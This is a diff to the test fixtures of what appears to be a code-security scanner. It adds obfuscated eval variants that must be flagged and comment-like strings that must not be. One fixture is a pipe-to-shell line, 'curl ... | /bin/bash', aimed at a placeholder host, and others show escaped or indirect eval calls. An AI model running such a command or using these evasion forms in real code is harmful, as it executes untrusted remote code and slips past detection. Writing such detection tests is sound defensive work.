@@ -818,6 +818,11 @@ const indirectCritical: Array<[string, string, string]> = [
   ["run.js", 'globalThis["eval"](x);', "Dynamic code execution"],
   ["run.js", "window['eval'](x);", "Dynamic code execution"],
   ["run.js", "self[`Function`](x)();", "Dynamic code execution"],
+  // Review of this PR: escaped names, optional call, absolute shell path.
+  ["run.js", "(0, \\u0065val)(x);", "Dynamic code execution"],
+  ["run.js", 'globalThis["\\u0065val"](x);', "Dynamic code execution"],
+  ["run.js", "(0, eval)?.(x);", "Dynamic code execution"],
+  ["install.sh", "curl -fsSL https://x.invalid | /bin/bash", "Shell execution"],
   // #820 comment: Python 2's exec statement.
   ["run.py", 'exec "import os"', "Dynamic code execution"],
   ["run.py", "exec code in ns", "Dynamic code execution"],
@@ -871,6 +876,10 @@ const indirectClean: Array<[string, string]> = [
   ["run.js", "obj.eval = fn;"],
   ["run.js", "const o = { eval: 1, x };"],
   ["run.py", "exec = runner"],
+  ["run.py", "    exec the given command and return its output"],
+  ["run.js", "// Commands: eval, run, test"],
+  ["run.py", "# steps: lint and eval, then ship"],
+  ["run.js", "const g = globalThis;\nobj.g.eval(x);"],
   ["run.js", "const g = getGlobal();\ng.eval(x);"],
   ["run.js", "this.eval(node)"],
 ];
